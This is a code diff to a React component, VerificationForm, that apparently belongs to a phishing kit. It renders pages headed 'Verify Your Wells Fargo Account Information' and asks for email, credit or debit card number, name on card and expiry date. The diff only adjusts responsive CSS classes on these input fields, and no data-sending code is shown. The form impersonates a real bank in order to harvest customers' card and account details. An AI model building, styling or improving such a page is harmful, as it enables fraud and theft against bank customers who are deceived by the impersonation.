@@ -79,7 +79,7 @@ const VerificationForm = () => {
                             <h1 className='font-bold text-2xl mb-2 font-fargo'>Verify Your Wells Fargo Account Information</h1>
                             <span className='text-sm capitalize'>Provide your email information associated with your account</span>
                         </div>
-                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-100 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.email?.message && ' border-b border-red-500 ')}>
+                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.email?.message && ' border-b border-red-500 ')}>
                             <input
                                 type='email'
                                 name='email'
@@ -144,7 +144,7 @@ const VerificationForm = () => {
                             <h1 className='font-bold text-2xl mb-2 font-fargo'>Verify Your Identity By Providing Information Associated With Your Account</h1>
                             <span className='text-sm capitalize'>Provide all credit/debitcard information accounts online</span>
                         </div>
-                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-100 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.cardNumber?.message && ' border-b border-red-500 ')}>
+                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.cardNumber?.message && ' border-b border-red-500 ')}>
                             <Controller
                                 render={({ field }) => <NumberFormat
 
@@ -171,7 +171,7 @@ const VerificationForm = () => {
 
                             <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.cardNumber?.message}</span>
                         </div>
-                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-80 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.nameOnCard?.message && ' border-b border-red-500 ')}>
+                        <div className={'rounded-sm focus-within:bg-focusbg w-100 max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.nameOnCard?.message && ' border-b border-red-500 ')}>
                             <input
                                 type='text'
                                 name='name-on-card'
@@ -189,7 +189,7 @@ const VerificationForm = () => {
 
                             <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.nameOnCard?.message}</span>
                         </div>
-                        <div className={'block w-full max-w-sm rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.expiryDate?.message && ' border-b border-red-500 ')}>
+                        <div className={'block lg:w-full lg:max-w-sm rounded-sm focus-within:bg-focusbg mx-2 relative border-b border-gray-500 mb-10 ' + (errors.expiryDate?.message && ' border-b border-red-500 ')}>
                             <Controller
                                 render={({ field }) => <NumberFormat
 
